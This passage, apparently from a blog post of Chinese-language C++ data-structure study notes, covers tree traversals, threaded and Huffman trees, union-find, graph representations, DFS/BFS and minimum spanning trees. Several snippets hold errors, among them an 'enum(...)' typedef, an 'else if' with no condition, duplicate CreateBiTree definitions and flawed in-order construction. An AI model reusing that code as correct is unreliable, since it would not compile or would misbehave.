&lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123;string s &#x3D; &quot;hello, world&quot;;cout &lt;&lt; s.size() &lt;&lt; endl;size_t pos1 &#x3D; s.find(&#39;o&#39;);size_t pos2 &#x3D; s.find(&quot;world&quot;, 0);string sub &#x3D; s.substr(7, 5);string s2 &#x3D; s;s2.insert(5, &quot; C++&quot;);string s3 &#x3D; s;s3.replace(0, 5, &quot;Hi&quot;);&#125;</code></pre><h3 id="广义表">广义表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">typedef enum(ATOM,LIST) ElemTag;&#x2F;&#x2F;ATOM&#x3D;&#x3D;0,原子；LIST&#x3D;&#x3D;1，子表typedef struct GLNode&#123;    ElemTag tag;&#x2F;&#x2F;区分原子结点or表结点    union&#123;        AtomType atom;&#x2F;&#x2F;原子值域        struct&#123;            struct GNode* hp,*tp;        &#125;ptr;    &#125;;&#125;*GList;GetHead(LS);&#x2F;&#x2F;取表头GetTail(LS);&#x2F;&#x2F;取表尾，仍为广义表</code></pre><h2 id="树">树</h2><h4 id="二叉树">二叉树</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;queue&gt;using namespace std;#define MAXSIZE 100typedef int TElemType;&#x2F;&#x2F; 顺序存储结构（即层序遍历，空结点值为0）typedef struct&#123;    TElemType data[MAXSIZE];&#125;SqBiTree;&#x2F;&#x2F; 链式定义结点结构typedef struct BiTNode &#123;    TElemType data;    BiTNode *lchild, *rchild;&#125; BiTNode, *BiTree;&#x2F;&#x2F; 中序遍历（递归）void InOrderTraverse(BiTree T) &#123;    if (T) &#123;        InOrderTraverse(T-&gt;lchild);        cout &lt;&lt; T-&gt;data;        InOrderTraverse(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 先序遍历（递归）void PreOrderTraverse(BiTree T) &#123;    if (T) &#123;        cout &lt;&lt; T-&gt;data;        PreOrderTraverse(T-&gt;lchild);        PreOrderTraverse(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 后序遍历（递归）void PostOrderTraverse(BiTree T) &#123;    if (T) &#123;        PostOrderTraverse(T-&gt;lchild);        PostOrderTraverse(T-&gt;rchild);        cout &lt;&lt; T-&gt;data;    &#125;&#125;&#x2F;&#x2F; 中序遍历（非递归）void InOrderTraverse_NonRecursive(BiTree T) &#123;    stack&lt;BiTree&gt; s;    BiTree p &#x3D; T;    while (p || !s.empty()) &#123;        if (p) &#123;            s.push(p);            p &#x3D; p-&gt;lchild;        &#125; else &#123;            BiTree q &#x3D; s.top();            s.pop();            cout &lt;&lt; q-&gt;data;            p &#x3D; q-&gt;rchild;        &#125;    &#125;&#125;&#x2F;&#x2F; 先序遍历（非递归）void PreOrderTraverse_NonRecursive(BiTree T) &#123;    if (!T) return;    stack&lt;BiTree&gt; s;    s.push(T);    while (!s.empty()) &#123;        BiTree q &#x3D; s.top();        s.pop();        cout &lt;&lt; q-&gt;data;        if (q-&gt;rchild) s.push(q-&gt;rchild); &#x2F;&#x2F; 右子树后访问 根据栈先进后出的原则先进        if (q-&gt;lchild) s.push(q-&gt;lchild);    &#125;&#125;&#x2F;&#x2F; 后序遍历（非递归）void PostOrderTraverse_NonRecursive(BiTree T) &#123;    stack&lt;BiTree&gt; s;    BiTree p &#x3D; T;    BiTree lastVisited &#x3D; nullptr;    while (p || !s.empty()) &#123;        if (p) &#123;            s.push(p);            p &#x3D; p-&gt;lchild;        &#125; else &#123;            BiTree q &#x3D; s.top();            if (q-&gt;rchild &amp;&amp; lastVisited !&#x3D; q-&gt;rchild) &#123;                p &#x3D; q-&gt;rchild;            &#125; else &#123;                cout &lt;&lt; q-&gt;data;                lastVisited &#x3D; q;                s.pop();            &#125;        &#125;    &#125;&#125;&#x2F;&#x2F; 层次遍历二叉树void LevelOrderTraverse(BiTree T) &#123;    if (!T) return;    queue&lt;BiTree&gt; q;    q.push(T);    while (!q.empty()) &#123;        BiTree node &#x3D; q.front();        q.pop();        cout &lt;&lt; node-&gt;data &lt;&lt; &#39; &#39;;        if (node-&gt;lchild)            q.push(node-&gt;lchild);        if (node-&gt;rchild)            q.push(node-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据前序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;        CreateBiTree(T-&gt;lchild);        CreateBiTree(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据中序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        CreateBiTree(T-&gt;lchild);        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;        CreateBiTree(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据后序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        CreateBiTree(T-&gt;lchild);        CreateBiTree(T-&gt;rchild);        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;    &#125;&#125;&#x2F;&#x2F; 计算二叉树的高度int Depth(BiTree T) &#123;    if (!T) return 0;    int m &#x3D; Depth(T-&gt;lchild);    int n &#x3D; Depth(T-&gt;rchild);    return (m &gt; n ? m + 1 : n + 1);&#125;&#x2F;&#x2F; 统计二叉树的节点个数int NodeCount(BiTree T) &#123;    if (!T) return 0;    return NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + 1;&#125;&#x2F;&#x2F; 线索二叉树的结点结构typedef struct BiThrNode &#123;    TElemType data;    BiThrNode *lchild, *rchild;    int LTag, RTag; &#x2F;&#x2F; 0 表示指针，1 表示线索&#125; BiThrNode, *BiThrTree;&#x2F;&#x2F; 全局变量，用于中序线索化过程中的前驱节点BiThrNode *pre &#x3D; nullptr;&#x2F;&#x2F; 中序线索化（递归）void InThreading(BiThrTree p) &#123;    if (p) &#123;        InThreading(p-&gt;lchild);        if (!p-&gt;lchild) &#123;            p-&gt;LTag &#x3D; 1;            p-&gt;lchild &#x3D; pre;        &#125; else &#123;            p-&gt;LTag &#x3D; 0;        &#125;        if (pre &amp;&amp; !pre-&gt;rchild) &#123;            pre-&gt;RTag &#x3D; 1;            pre-&gt;rchild &#x3D; p;        &#125; else if &#123;            pre-&gt;RTag &#x3D; 0;        &#125;        pre &#x3D; p;        InThreading(p-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 构建中序线索二叉树（带头结点）void CreateInOrderThread(BiThrTree &amp;T) &#123;    BiThrTree head &#x3D; new BiThrNode;    head-&gt;LTag &#x3D; 0;    head-&gt;RTag &#x3D; 1;    head-&gt;rchild &#x3D; head;    pre &#x3D; head;    head-&gt;lchild &#x3D; T;    InThreading(T);    pre-&gt;rchild &#x3D; head;    pre-&gt;RTag &#x3D; 1;    T &#x3D; head;&#125;&#x2F;&#x2F; 遍历中序线索二叉树（非递归）void InOrderTraverse_Thr(BiThrTree T) &#123;    BiThrTree p &#x3D; T-&gt;lchild;    while (p !&#x3D; T) &#123;        while (p-&gt;LTag &#x3D;&#x3D; 0) p &#x3D; p-&gt;lchild;        cout &lt;&lt; p-&gt;data;        while (p-&gt;RTag &#x3D;&#x3D; 1 &amp;&amp; p-&gt;rchild !&#x3D; T) &#123;            p &#x3D; p-&gt;rchild;            cout &lt;&lt; p-&gt;data;        &#125;        p &#x3D; p-&gt;rchild;    &#125;&#125;</code></pre><h4 id="树与森林">树与森林</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#define MAXSIZE 100&#x2F;&#x2F; 双亲表示法typedef struct&#123;    char data;    int parent;&#125;PTNode;typedef struct&#123;    PTNode nodes[MAXSIZE];    int n;&#125;PTree;&#x2F;&#x2F; 孩子表示法typedef struct CSNode&#123;    char data;    struct CSNode* firstchild,*nextsibling;&#125;CSNode,*CSTree;</code></pre><h4 id="哈夫曼树">哈夫曼树</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;queue&gt;#include &lt;vector&gt;using namespace std;typedef struct&#123;    int weight;    int parent, lchild, rchild;&#125; HTNode, *HuffmanTree;typedef char **HuffmanCode;void CreateHuffmanTree(HuffmanTree &amp;T, int n)&#123;    if (n &lt;&#x3D; 1)        return;    int m &#x3D; 2 * n - 1;    T &#x3D; new HTNode[m + 1];    &#x2F;&#x2F; 初始化所有节点    for (int i &#x3D; 1; i &lt;&#x3D; m; i++)    &#123;        T[i].parent &#x3D; 0;        T[i].lchild &#x3D; 0;        T[i].rchild &#x3D; 0;        T[i].weight &#x3D; 0;    &#125;    &#x2F;&#x2F; 输入叶子节点权重    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        cin &gt;&gt; T[i].weight;    &#125;    &#x2F;&#x2F; 使用优先队列存储    priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        pq.push(make_pair(T[i].weight, i));    &#125;    int current &#x3D; n + 1; &#x2F;&#x2F; 当前中间节点索引    for (int i &#x3D; 1; i &lt;&#x3D; n - 1; i++)    &#123;        &#x2F;&#x2F; 获取两个最小节点        int s1 &#x3D; -1, s2 &#x3D; -1;        &#x2F;&#x2F; 寻找第一个有效节点        while (!pq.empty() &amp;&amp; s1 &#x3D;&#x3D; -1)        &#123;            auto top &#x3D; pq.top();            pq.pop();            if (T[top.second].parent &#x3D;&#x3D; 0)            &#123;                s1 &#x3D; top.second;            &#125;        &#125;        &#x2F;&#x2F; 寻找第二个有效节点        while (!pq.empty() &amp;&amp; s2 &#x3D;&#x3D; -1)        &#123;            auto top &#x3D; pq.top();            pq.pop();            if (T[top.second].parent &#x3D;&#x3D; 0)            &#123;                s2 &#x3D; top.second;            &#125;        &#125;        if (s1 &#x3D;&#x3D; -1 || s2 &#x3D;&#x3D; -1)        &#123;            return;        &#125;        &#x2F;&#x2F; 创建新节点        T[current].weight &#x3D; T[s1].weight + T[s2].weight;        T[current].lchild &#x3D; s1;        T[current].rchild &#x3D; s2;        T[s1].parent &#x3D; current;        T[s2].parent &#x3D; current;        &#x2F;&#x2F; 将新节点加入优先队列        pq.push(make_pair(T[current].weight, current));        current++;    &#125;&#125;void CreateHuffmanCode(HuffmanTree HT, HuffmanCode &amp;HC, int n)&#123;    HC &#x3D; new char *[n + 1];    char *cd &#x3D; new char[n];    cd[n - 1] &#x3D; &#39;\0&#39;;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        int start &#x3D; n - 1;        int c &#x3D; i;        int f &#x3D; HT[i].parent;        while (f !&#x3D; 0)        &#123;            start--;            if (HT[f].lchild &#x3D;&#x3D; c)            &#123;                cd[start] &#x3D; &#39;0&#39;;            &#125;            else            &#123;                cd[start] &#x3D; &#39;1&#39;;            &#125;            c &#x3D; f;            f &#x3D; HT[f].parent;        &#125;        HC[i] &#x3D; new char[n - start];        strcpy(HC[i], &amp;cd[start]);    &#125;    delete[] cd;&#125;</code></pre><h4 id="并查集">并查集</h4><pre class="language-c++" data-language="c++"><code class="language-c++">const int MAXN &#x3D; 1000;int father[MAXN];int Rank[MAXN];void init()&#123;    for (int i &#x3D; 0; i &lt; MAXN; i++)    &#123;        father[i] &#x3D; i;        Rank[i] &#x3D; 1;    &#125;&#125;int find_set(int x)&#123;    if (x !&#x3D; father[x])    &#123;        father[x] &#x3D; find_set(father[x]);    &#125;    return father[x];&#125;void Union(int x, int y)&#123;    int root_x &#x3D; find_set(x);    int root_y &#x3D; find_set(y);    if (root_x &#x3D;&#x3D; root_y)        return;    if (Rank[root_x] &gt; Rank[root_y])    &#123;        father[root_y] &#x3D; root_x;        Rank[root_x] +&#x3D; Rank[root_y];    &#125;    else    &#123;        father[root_x] &#x3D; root_y;        Rank[root_y] +&#x3D; Rank[root_x];    &#125;&#125;</code></pre><h2 id="图">图</h2><p><strong>邻接矩阵</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MaxInt 32767     &#x2F;&#x2F; 极大值#define MVNum 100        &#x2F;&#x2F; 顶点最大值typedef char VerTexType; &#x2F;&#x2F; 顶点类型定义typedef int ArcType;     &#x2F;&#x2F; 边类型定义&#x2F;&#x2F; 邻接矩阵表示法typedef struct&#123;    VerTexType vexs[MVNum];     &#x2F;&#x2F; 顶点表    ArcType arcs[MVNum][MVNum]; &#x2F;&#x2F; 邻接矩阵    int vexnum, arcnum; &#x2F;&#x2F; 顶点数目 边数目&#125; AMGraph;&#x2F;&#x2F; 为AMGraph定位顶点int LocateVex(AMGraph G, VerTexType v)&#123;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)        &#123;            return i;        &#125;    &#125;    return -1;&#125;&#x2F;&#x2F; 初始化邻接矩阵void CreateAM(AMGraph &amp;G)&#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        for (int j &#x3D; 0; j &lt; G.vexnum; j++)        &#123;            if (i &#x3D;&#x3D; j)            &#123;                G.arcs[i][j] &#x3D; 0;            &#125;            else            &#123;                G.arcs[i][j] &#x3D; MaxInt;            &#125;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcnum; k++)    &#123;        VerTexType v1, v2;        ArcType w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        G.arcs[i][j] &#x3D; w;        G.arcs[j][i] &#x3D; w;    &#125;&#125;</code></pre><p><strong>邻接表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;&#x2F;&#x2F; 邻接表表示法typedef struct ArcNode&#123;    int adjvex; &#x2F;&#x2F; 该边指向的顶点位置    int weight; &#x2F;&#x2F; 边的权重    struct ArcNode *nextarc;&#125; ArcNode;typedef struct VNode&#123;    VerTexType data;   &#x2F;&#x2F; 顶点信息    ArcNode *firstarc; &#x2F;&#x2F; 指向第一条边的指针&#125; VNode, AdjList[MVNum];typedef struct&#123;    AdjList vertices;   &#x2F;&#x2F; 邻接表    int vexnum, arcnum; &#x2F;&#x2F; 顶点数和边数&#125; ALGraph;&#x2F;&#x2F; 为 ALGraph 定位顶点int LocateVex(const ALGraph &amp;G, VerTexType v)&#123;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        if (G.vertices[i].data &#x3D;&#x3D; v)        &#123;            return i;        &#125;    &#125;    return -1;&#125;&#x2F;&#x2F; 初始化邻接表void CreateAL(ALGraph &amp;G)&#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        cin &gt;&gt; G.vertices[i].data;        G.vertices[i].firstarc &#x3D; NULL;    &#125;    for (int k &#x3D; 0; k &lt; G.arcnum; k++)    &#123;        VerTexType v1, v2;        ArcType weight;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; weight;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        &#x2F;&#x2F; 添加边 v1 -&gt; v2 头插法        ArcNode *p1 &#x3D; new ArcNode;        p1-&gt;adjvex &#x3D; j;        p1-&gt;weight &#x3D; weight;        p1-&gt;nextarc &#x3D; G.vertices[i].firstarc;        G.vertices[i].firstarc &#x3D; p1;        &#x2F;* 添加边 v2 -&gt; v1（无向图必须对称）        ArcNode *p2 &#x3D; new ArcNode;        p2-&gt;adjvex &#x3D; i;        p2-&gt;weight &#x3D; weight;        p2-&gt;nextarc &#x3D; G.vertices[j].firstarc;        G.vertices[j].firstarc &#x3D; p2;        *&#x2F;    &#125;&#125;</code></pre><p><strong>十字链表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 十字链表表示法（有向图）typedef struct ArcNode_OL &#123;    int tailvex;             &#x2F;&#x2F; 弧尾顶点位置    int headvex;             &#x2F;&#x2F; 弧头顶点位置    struct ArcNode_OL *hlink; &#x2F;&#x2F; 指向同一弧头的下一条弧    struct ArcNode_OL *tlink; &#x2F;&#x2F; 指向同一弧尾的下一条弧    int weight;              &#x2F;&#x2F; 弧的权值    InfoType info;        &#x2F;&#x2F; 其他信息&#125; ArcNode_OL;typedef struct VexNode_OL &#123;    VerTexType data;         &#x2F;&#x2F; 顶点数据    ArcNode_OL *firstin;     &#x2F;&#x2F; 指向以该顶点为弧头的第一条弧    ArcNode_OL *firstout;    &#x2F;&#x2F; 指向以该顶点为弧尾的第一条弧&#125; VexNode_OL;typedef struct &#123;    VexNode_OL xlist[MVNum]; &#x2F;&#x2F; 顶点表    int vexnum, arcnum;      &#x2F;&#x2F; 顶点数和弧数&#125; OLGraph;</code></pre><p><strong>邻接多重表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 邻接多重表表示法（无向图）typedef struct EBox &#123;    int ivex, jvex;          &#x2F;&#x2F; 该边依附的两个顶点位置    struct EBox *ilink;      &#x2F;&#x2F; 指向依附于顶点ivex的下一条边    struct EBox *jlink;      &#x2F;&#x2F; 指向依附于顶点jvex的下一条边    int weight;              &#x2F;&#x2F; 边的权值    bool mark;             &#x2F;&#x2F; 访问标记    InfoType info;         &#x2F;&#x2F; 其他信息&#125; EBox;typedef struct VexBox &#123;    VerTexType data;         &#x2F;&#x2F; 顶点数据    EBox *firstedge;         &#x2F;&#x2F; 指向第一条依附于该顶点的边&#125; VexBox;typedef struct &#123;    VexBox adjmulist[MVNum]; &#x2F;&#x2F; 顶点表    int vexnum, edgenum;     &#x2F;&#x2F; 顶点数和边数&#125; AMLGraph;</code></pre><p><strong>DFS</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int MVNum &#x3D; 100;bool visited[MVNum];vector&lt;int&gt; path;struct AMGraph&#123;    int arcs[MVNum][MVNum];    int vexnum, arcnum;&#125;;struct ArcNode&#123;    int adjvex;    ArcNode *nextarc;&#125;;struct VNode&#123;    ArcNode *firstarc;&#125;;struct ALGraph&#123;    VNode vertices[MVNum];    int vexnum, arcnum;&#125;;void DFS_AM(AMGraph G, int v)&#123;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    for (int w &#x3D; 0; w &lt; G.vexnum; w++)        if (G.arcs[v][w] &amp;&amp; !visited[w])            DFS_AM(G, w);&#125;void DFS_AL(ALGraph G, int v)&#123;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    ArcNode *p &#x3D; G.vertices[v].firstarc;    while (p)    &#123;        int w &#x3D; p-&gt;adjvex;        if (!visited[w])            DFS_AL(G, w);        p &#x3D; p-&gt;nextarc;    &#125;&#125;void DFSTraverse_AM(AMGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            DFS_AM(G, i);&#125;void DFSTraverse_AL(ALGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            DFS_AL(G, i);&#125;void PrintPath()&#123;    for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123;        cout &lt;&lt; path[i];        if (i &lt; path.size() - 1)            cout &lt;&lt; &quot; -&gt; &quot;;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><p><strong>BFS</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;using namespace std;const int MVNum &#x3D; 100;bool visited[MVNum];vector&lt;int&gt; path;struct AMGraph&#123;    int arcs[MVNum][MVNum];    int vexnum, arcnum;&#125;;struct ArcNode&#123;    int adjvex;    ArcNode *nextarc;&#125;;struct VNode&#123;    ArcNode *firstarc;&#125;;struct ALGraph&#123;    VNode vertices[MVNum];    int vexnum, arcnum;&#125;;void BFS_AM(AMGraph G, int v)&#123;    queue&lt;int&gt; Q;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    Q.push(v);    while (!Q.empty())    &#123;        int u &#x3D; Q.front();        Q.pop();        for (int w &#x3D; 0; w &lt; G.vexnum; w++)        &#123;            if (G.arcs[u][w] &amp;&amp; !visited[w])            &#123;                cout &lt;&lt; w &lt;&lt; &quot; &quot;;                visited[w] &#x3D; true;                path.push_back(w);                Q.push(w);            &#125;        &#125;    &#125;&#125;void BFS_AL(ALGraph G, int v)&#123;    queue&lt;int&gt; Q;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    Q.push(v);    while (!Q.empty())    &#123;        int u &#x3D; Q.front();        Q.pop();        ArcNode *p &#x3D; G.vertices[u].firstarc;        while (p)        &#123;            int w &#x3D; p-&gt;adjvex;            if (!visited[w])            &#123;                cout &lt;&lt; w &lt;&lt; &quot; &quot;;                visited[w] &#x3D; true;                path.push_back(w);                Q.push(w);            &#125;            p &#x3D; p-&gt;nextarc;        &#125;    &#125;&#125;void BFSTraverse_AM(AMGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            BFS_AM(G, i);&#125;void BFSTraverse_AL(ALGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            BFS_AL(G, i);&#125;void PrintPath()&#123;    for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123;        cout &lt;&lt; path[i];        if (i &lt; path.size() - 1)            cout &lt;&lt; &quot; -&gt; &quot;;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><p><strong>最小生成树（MST）</strong></p><p><strong>Kruskal</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MAXVEX 100#define INF 114514typedef struct &#123;    int adjvex;    int weight;    struct ArcNode *next;&#125; ArcNode;typedef struct &#123;    ArcNode *firstarc;&#125; AdjList[MAXVEX];typedef struct &#123;    AdjList vertices;    int vexnum, arcnum;&#125; Graph;bool hasCycle(Graph &amp;G, int from, int to, vector&lt;bool&gt;&amp; visited, int parent) &#123;    visited[from] &#x3D; true;    ArcNode* p &#x3D; G.vertices[from].firstarc;    while(p) &#123;        int next &#x3D; p-&gt;adjvex;        if(!visited[next]) &#123;        if(hasCycle(G, next, to, visited, from)) &#123;                return true;            &#125;        &#125;        else if( next !&#x3D; parent &amp;&amp; next &#x3D;&#x3D; to) &#123;            return true;        &#125;        p &#x3D; p-&gt;next;    &#125;    return false;&#125;bool isSafe(Graph &amp;G, int from, int to) &#123;    vector&lt;bool&gt; visited(G.vexnum + 1, false);    return !hasCycle(G, from, to, visited, -1);&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123;        G.vertices[i].firstarc &#x3D; nullptr;    &#125;    for(int i&#x3D;1; i&lt;&#x3D;G.arcnum; i++) &#123;        int m,n,w;        cin &gt;&gt; m &gt;&gt; n &gt;&gt; w;        ArcNode *p1 &#x3D; new ArcNode;        p1-&gt;adjvex &#x3D; n;        p1-&gt;weight &#x3D; w;        p1-&gt;next &#x3D; G.vertices[m].firstarc;        G.vertices[m].firstarc &#x3D; p1;        ArcNode *p2 &#x3D; new ArcNode;        p2-&gt;adjvex &#x3D; m;        p2-&gt;weight &#x3D; w;        p2-&gt;next &#x3D; G.vertices[n].firstarc;        G.vertices[n].firstarc &#x3D; p2;    &#125;&#125;void PrintMST(vector&lt;vector&lt;int&gt;&gt; &amp;mst, int n) &#123;    for(int i&#x3D;1; i&lt;&#x3D;n; i++) &#123;        for(int j&#x3D;i+1; j&lt;&#x3D;n; j++) &#123;            if(mst[i][j] !&#x3D; 0) &#123;                cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    vector&lt;vector&lt;int&gt;&gt; mst(G.vexnum+1, vector&lt;int&gt;(G.vexnum+1, 0));    int MSTedge &#x3D; 0;    while(MSTedge &lt; G.vexnum-1) &#123;        int min &#x3D; INF;        int p1 &#x3D; -1, p2 &#x3D; -1;        for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123;            ArcNode *p &#x3D; G.vertices[i].firstarc;            while(p) &#123;                if(p-&gt;weight &lt; min &amp;&amp; !mst[i][p-&gt;adjvex] &amp;&amp; isSafe(G, i, p-&gt;adjvex)) &#123;                    min &#x3D; p-&gt;weight;                    p1 &#x3D; i;                    p2 &#x3D; p-&gt;adjvex;                &#125;                p &#x3D; p-&gt;next;            &#125;        &#125;        if(p1 &#x3D;&#x3D; -1) &#123;            cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            return 1;        &#125;        mst[p1][p2] &#x3D; 1;        mst[p2][p1] &#x3D; 1;        MSTedge++;    &#125;    PrintMST(mst, G.vexnum);    return 0;&#125;</code></pre><p><strong>Prim</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;#define INF 32366#define MAX_VERTICES 100typedef struct &#123;    int edges[MAX_VERTICES][MAX_VERTICES];    int edgeCount;    int vertexCount;&#125; Graph;void printMST(vector&lt;vector&lt;int&gt;&gt;&amp; mst, int n) &#123;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; i + 1; j &lt;&#x3D; n; j++) &#123;            if(mst[i][j] &#x3D;&#x3D; 1) &#123;                cout &lt;&lt; i &lt;&lt; &quot; - &quot; &lt;&lt; j &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main() &#123;    int n;    cin &gt;&gt; n;    Graph g;    g.edgeCount &#x3D; n - 1;    g.vertexCount &#x3D; n;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            g.edges[i][j] &#x3D; INF;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        int from, to, weight;        cin &gt;&gt; from &gt;&gt; to &gt;&gt; weight;        g.edges[from][to] &#x3D; weight;        g.edges[to][from] &#x3D; weight;    &#125;    vector&lt;bool&gt; visited(n + 1, false);    vector&lt;vector&lt;int&gt;&gt; mst(n + 1, vector&lt;int&gt;(n + 1, 0));    visited[1] &#x3D; true;    int mstEdgeCount &#x3D; 0;    while(mstEdgeCount &lt; n - 1) &#123;        int minWeight &#x3D; INF;        int minFrom &#x3D; -1;        int minTo &#x3D; -1;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;            if(visited[i]) &#123;                for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;                    if(!visited[j] &amp;&amp; g.edges[i][j] &lt; minWeight) &#123;                        minWeight &#x3D; g.edges[i][j];                        minFrom &#x3D; i;                        minTo &#x3D; j;                    &#125;                &#125;            &#125;        &#125;        if(minFrom &#x3D;&#x3D; -1) &#123;            cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            return 1;        &#125;        mst[minFrom][minTo] &#x3D; 1;        mst[minTo][minFrom] &#x3D; 1;        visited[minTo] &#x3D; true;        mstEdgeCount++;    &#125;    printMST(mst, n);    return 0;&#125;</code></pre><p><strong>最短路径</strong></p><p><strong>Dijkstra</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct&#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v)&#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void Create(Graph &amp;G)&#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++)        &#123;            G.arcs[i][j]&#x3D;INF;            if(i&#x3D;&#x3D;j)            &#123;                G.arcs[i][j]&#x3D;0;            &#125;        &#125;    &#125;    for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++)    &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;  